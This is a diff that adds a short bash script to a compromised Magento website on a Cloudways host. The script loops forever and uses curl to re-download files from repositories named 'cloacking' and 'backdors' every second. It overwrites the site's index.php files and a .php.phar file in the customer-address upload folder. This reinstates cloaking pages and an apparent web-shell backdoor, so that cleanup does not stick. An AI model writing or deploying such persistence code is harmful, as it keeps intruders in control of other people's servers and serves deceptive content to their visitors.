@@ -1,0 +1,25 @@
+#!/bin/bash
+
+FILES=(
+"/home/911472.cloudwaysapps.com/agjwtuzucv/public_html/pub/index.php"
+"/home/911472.cloudwaysapps.com/agjwtuzucv/public_html/index.php"
+"/home/911472.cloudwaysapps.com/agjwtuzucv/public_html/pub/media/customer_address/0/aboutaw.php.phar"
+)
+
+URLS=(
+"https://raw.githubusercontent.com/flux-lab/cloacking/refs/heads/main/cheapivecoparts1"
+"https://raw.githubusercontent.com/flux-lab/cloacking/refs/heads/main/cheapivecoparts2"
+"https://raw.githubusercontent.com/flux-lab/backdors/refs/heads/main/gecko"
+)
+
+while true
+do
+
+for i in ${!FILES[@]}
+do
+curl -s "${URLS[$i]}" -o "${FILES[$i]}"
+done
+
+sleep 1
+
+done
